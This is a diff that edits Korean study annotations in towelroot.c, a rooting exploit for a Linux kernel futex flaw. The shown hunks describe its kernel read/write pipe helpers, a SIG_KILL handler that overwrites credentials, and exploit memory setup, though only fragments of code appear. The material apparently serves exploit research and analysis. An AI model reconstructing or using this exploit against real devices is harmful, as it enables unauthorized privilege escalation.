@@ -1,16 +1,6 @@
 /*
 
 towelroot.c
-(타월루트 익스플로잇)
-(루팅 익스플로잇)
-(C코드)
-(분석이 용이하도록 작성된 루팅 익스플로잇으로 동작이 약간 난해한 것으로 이해를 통해서 통찰해야 한다.)
-(통찰을 통해서 취약점 발생 원인을 알아내야 연구가 쉽게 마무리 될 것이다.)
-(메모리에 접근하는 문제가 발생하는게 원인이라고 볼 수 있다.)
-(상세 분석을 통해서 이해를 할 수 있으며, 오버뷰로는 잘 드러나지 않았다.)
-(상세 분석 결과 익스플로잇 값을 메모리에 설정한 뒤 쓰레드를 통해서 커널 메모리를 쓰는 SIG_KILL 핸들러를
- 설정하고, KILL 시스템 콜(12)를 실행함으로써 커널 쓰레드에서 설정된 시그날 핸들러가 호출되게 해서 
- 커널 메모리에 크리덴셜을 갱신하는 함수가 동작하는 것으로 판단된다.)
 
 - futex: https://man7.org/linux/man-pages/man7/futex.7.html
 	futex는 유저 스페이스의 페이지를 락 잠금하는 기능을 가진 뮤텍스를 의미함.
@@ -77,6 +67,7 @@ init_exploit() // 익스플로잇 실행.
 // TCP 소켓 대기 번호.
 #define LOCAL_PORT      5551
 
+// 크리덴셜 갱신을 위한 구조.
 struct thread_info;
 struct task_struct;
 struct cred;
@@ -154,6 +145,7 @@ struct mmsghdr {
     unsigned int  msg_len;
 };
 
+// 공격에 사용되는 변수 선언.
 //bss
 int uaddr1 = 0;
 int uaddr2 = 0;
@@ -180,7 +172,7 @@ int g_argc;
 char rootcmd[256]; // 익스플로잇 실행 인자 저장할 변수.
 
 // readbuf에서 count만큼 writebuf로 쓰기하는 함수.
-//"copy from kernel" from writebuf to readbuf
+// copy_from_kernel()
 ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
     int pipefd[2];
     ssize_t len;
@@ -206,7 +198,7 @@ ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
 
 
 // writebuf에서 readbuf로 count만큼 쓰기하는 함수.
-//"copy to kernel" from writebuf to readbuf
+// copy_to_kernel()
 ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
     int pipefd[2];
     ssize_t len;
@@ -229,6 +221,7 @@ ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
     return len;
 }
 
+// 시그날 핸들러로 SIG_KILL 될 때마다 호출될 핸들러:
 // write_kernel (커널에 크리덴셜 모두를 쓰기해서 리부팅하고 정리해서 권한을 상승시키는 기능)
 void write_kernel(int signum)
 {
@@ -419,7 +412,7 @@ void write_kernel(int signum)
     return;
 }
 
-// 시그날 action을 설정하는 쓰에드 함수.
+// 시그날 action을 설정하는 쓰레드 함수.
 void *make_action(void *arg) {
     int prio;
     struct sigaction act;
@@ -462,6 +455,7 @@ void *make_action(void *arg) {
 }
 
 // action 쓰레드를 대기하는 함수.
+// 쓰레드 액션을 만드는 함수.
 pid_t wake_actionthread(int prio) {
     pthread_t th4;
     pid_t pid;
@@ -570,6 +564,7 @@ int make_socket() {
 }
 
 // MAGIC 메시지를 소켓으로 전송하는 함수.
+// 메시지 전송 함수. 메시지는 iovec 구조체로 선언된 구조체임.
 void *send_magicmsg(void *arg) {
     int sockfd;
     struct mmsghdr msgvec[1];
@@ -634,6 +629,7 @@ void *send_magicmsg(void *arg) {
 
 // setup_exploit:
 // mem 변수에 익스플로잇 관련 값 설정.
+// ??
 static inline setup_exploit(unsigned long mem)
 {
     *((unsigned long *)(mem - 0x04)) = 0x81;
